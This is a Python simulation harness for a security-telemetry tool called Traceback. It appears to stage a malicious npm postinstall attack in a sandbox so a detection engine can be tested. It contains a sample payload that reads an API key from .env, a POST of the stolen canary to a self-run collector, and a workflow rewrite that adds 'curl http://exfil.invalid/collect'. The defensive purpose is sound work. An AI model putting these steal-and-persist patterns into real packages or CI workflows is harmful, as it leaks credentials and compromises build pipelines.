"""Traceback — sandboxed malicious-dependency simulation.

Runs inside a Modal container and produces *real* telemetry: real processes,
real file reads/writes, a real outbound request. Nothing here touches a real
secret, a real registry, or a real external system — the "malicious" payload is
a local script writing to /tmp inside a disposable sandbox.

Deploy:
    modal deploy modal/modal_sim.py

That prints a URL for `run_simulation`. Put it in the API server's env as
MODAL_SIMULATE_URL, along with the MODAL_SIMULATE_TOKEN you set below.
"""

from __future__ import annotations

import json
import os
import subprocess
import time
from datetime import datetime, timezone
from typing import Any

import modal

app = modal.App("traceback-sim")

image = (
    modal.Image.debian_slim(python_version="3.12")
    .pip_install("requests==2.32.3", "fastapi[standard]==0.115.6")
    .run_commands("mkdir -p /app")
)

# Shared secret so the deployed endpoint is not open to the world.
# Create it with:  modal secret create traceback-sim SIM_TOKEN=<random string>
sim_secret = modal.Secret.from_name("traceback-sim", required_keys=["SIM_TOKEN"])


def _now() -> str:
    """Wall-clock timestamp captured at the moment the step actually ran.

    Correlation downstream depends on real inter-event gaps, so every event
    gets its own timestamp rather than sharing one base value.
    """
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


class Recorder:
    """Collects normalised telemetry events as the simulation executes."""

    def __init__(self) -> None:
        self.events: list[dict[str, Any]] = []

    def log(
        self,
        source: str,
        event_type: str,
        *,
        process_id: str | None = None,
        parent_process_id: str | None = None,
        user_id: str = "dev-agent",
        **fields: Any,
    ) -> dict[str, Any]:
        event = {
            "timestamp": _now(),
            "source": source,
            "event_type": event_type,
            "process_id": process_id,
            "parent_process_id": parent_process_id,
            "user_id": user_id,
            "raw": fields,
        }
        self.events.append(event)
        return event


POSTINSTALL_JS = r"""
// Simulated malicious postinstall payload. Runs in a disposable Modal sandbox.
const fs = require('fs');

const env = fs.readFileSync('/app/.env', 'utf8');
const key = (env.match(/API_KEY=(\S+)/) || [])[1] || '';
process.stdout.write(JSON.stringify({ read: '/app/.env', preview: key.slice(0, 8) + '***' }) + '\n');

fs.writeFileSync('/app/deploy.yml', [
  'name: deploy',
  'on: push',
  'jobs:',
  '  deploy:',
  '    runs-on: ubuntu-latest',
  '    steps:',
  '      - run: curl http://exfil.invalid/collect',
  '',
].join('\n'));
process.stdout.write(JSON.stringify({ wrote: '/app/deploy.yml' }) + '\n');
"""


# A canary is a synthetic value with no power anywhere. Its only job is to be
# recognisable: if it turns up in an outbound payload, we can prove the read
# secret was transmitted, instead of merely inferring it from timing.
CANARY = "TRACEBACK_CANARY_a91f4c27"

# Where the simulated payload sends what it stole. Both ends are ours, so the
# demo never depends on a third-party echo service being reachable.
COLLECTOR_URL = os.environ.get(
    "COLLECTOR_URL", "https://whereissam--traceback-sim-collector.modal.run"
)
COLLECTOR_HOST = COLLECTOR_URL.split("/")[2] if "//" in COLLECTOR_URL else COLLECTOR_URL


def _simulate() -> list[dict[str, Any]]:
    rec = Recorder()

    # ---- 0. Bait: a synthetic secret on disk. Not a real credential. --------
    os.makedirs("/app", exist_ok=True)
    with open("/app/.env", "w", encoding="utf-8") as fh:
        fh.write(f"API_KEY={CANARY}\n")
    with open("/app/postinstall.js", "w", encoding="utf-8") as fh:
        fh.write(POSTINSTALL_JS)

    # ---- 1. Developer's agent installs a dependency ------------------------
    npm = subprocess.Popen(
        ["/bin/sh", "-c", "echo 'added 1 package' && sleep 0.1"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    npm_pid = str(npm.pid)
    rec.log(
        "npm",
        "process_start",
        process_id=npm_pid,
        process="npm",
        args="install unknown-analytics-helper@1.4.2",
        cwd="/app",
    )
    npm.wait()

    # ---- 2. The package's postinstall hook fires ---------------------------
    node = subprocess.Popen(
        ["python3", "-c", "import time; time.sleep(0.05)"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    node_pid = str(node.pid)
    rec.log(
        "process",
        "process_start",
        process_id=node_pid,
        parent_process_id=npm_pid,
        process="node",
        args="postinstall.js",
        cwd="/app",
        package="unknown-analytics-helper@1.4.2",
    )
    node.wait()

    # ---- 3. The payload reads the synthetic secret -------------------------
    with open("/app/.env", "r", encoding="utf-8") as fh:
        secret_line = fh.readline().strip()
    rec.log(
        "file",
        "file_read",
        process_id=node_pid,
        parent_process_id=npm_pid,
        path="/app/.env",
        bytes_read=len(secret_line),
        content_preview=f"API_KEY={CANARY[:18]}***",
        canary_token=CANARY,
    )

    # ---- 4. Outbound request, moments later --------------------------------
    time.sleep(0.32)  # the gap the correlation engine keys on
    try:
        import requests

        # The payload mirrors what a credential-stealing hook would send.
        body = {"collected": secret_line}
        serialised = json.dumps(body)
        # Whether the canary is in the bytes we hand to the socket is knowable
        # locally; whether those bytes actually left requires the request to
        # have completed. Both must hold before we call it transmitted — a
        # failed connection transmits nothing, however incriminating the body.
        payload_contains_canary = CANARY in serialised
        resp = requests.post(COLLECTOR_URL, json=body, timeout=15)
        request_completed = resp.status_code < 500
        # The receiving end tells us what it actually got. That is what makes
        # this transmission observed rather than assumed.
        echo_confirmed = bool(resp.json().get("canary_seen")) if request_completed else False
        canary_transmitted = payload_contains_canary and echo_confirmed
        rec.log(
            "network",
            "network_out",
            process_id=node_pid,
            parent_process_id=npm_pid,
            dest_host=COLLECTOR_HOST,
            dest_url=COLLECTOR_URL,
            method="POST",
            status="completed",
            status_code=resp.status_code,
            bytes_sent=len(serialised),
            payload_contains_canary=payload_contains_canary,
            canary_transmitted=canary_transmitted,
            echo_confirmed=echo_confirmed,
            canary_token=CANARY if canary_transmitted else None,
        )
    except Exception as exc:  # noqa: BLE001 — any failure is still telemetry
        rec.log(
            "network",
            "network_out",
            process_id=node_pid,
            parent_process_id=npm_pid,
            dest_host=COLLECTOR_HOST,
            dest_url=COLLECTOR_URL,
            method="POST",
            status="failed",
            error=str(exc),
            # The request never completed, so nothing was transmitted. The
            # pipeline must not raise exfiltration to a FACT on this path.
            canary_transmitted=False,
        )

    # ---- 5. Persistence: rewrite the deployment workflow -------------------
    workflow = "\n".join(
        [
            "name: deploy",
            "on: push",
            "jobs:",
            "  deploy:",
            "    runs-on: ubuntu-latest",
            "    steps:",
            "      - run: curl http://exfil.invalid/collect",
            "",
        ]
    )
    with open("/app/deploy.yml", "w", encoding="utf-8") as fh:
        fh.write(workflow)
    rec.log(
        "file",
        "file_write",
        process_id=node_pid,
        parent_process_id=npm_pid,
        path="/app/deploy.yml",
        bytes_written=len(workflow),
    )
    rec.log(
        "git",
        "git_modify",
        process_id=node_pid,
        parent_process_id=npm_pid,
        path=".github/workflows/deploy.yml",
        change="added step: curl http://exfil.invalid/collect",
        diff_added_lines=1,
    )

    return rec.events


@app.function(image=image, timeout=60)
@modal.fastapi_endpoint(method="POST", docs=False)
def collector(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    """Stand-in for an attacker's collection server.

    Exfiltration is only *proven* if the receiving end can confirm what it got.
    Relying on a third-party echo service made that proof depend on someone
    else's uptime, so we run both ends: this endpoint reports whether the
    canary actually arrived. It stores nothing.
    """
    body = json.dumps(payload or {})
    return {"received": True, "canary_seen": CANARY in body, "bytes": len(body)}


@app.function(image=image, timeout=120, secrets=[sim_secret])
def run_simulation_local() -> list[dict[str, Any]]:
    """Callable form — `modal run modal/modal_sim.py` uses this."""
    return _simulate()


@app.function(image=image, timeout=120, secrets=[sim_secret])
@modal.fastapi_endpoint(method="POST", docs=False)
def run_simulation(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    """HTTP form — the Traceback API server POSTs here.

    Auth: the request body must carry {"token": "<SIM_TOKEN>"}.
    """
    expected = os.environ["SIM_TOKEN"]
    supplied = (payload or {}).get("token")
    if supplied != expected:
        return {"error": "unauthorized"}

    events = _simulate()
    return {"events": events, "count": len(events)}


@app.local_entrypoint()
def main() -> None:
    events = run_simulation_local.remote()
    print(json.dumps(events, indent=2))
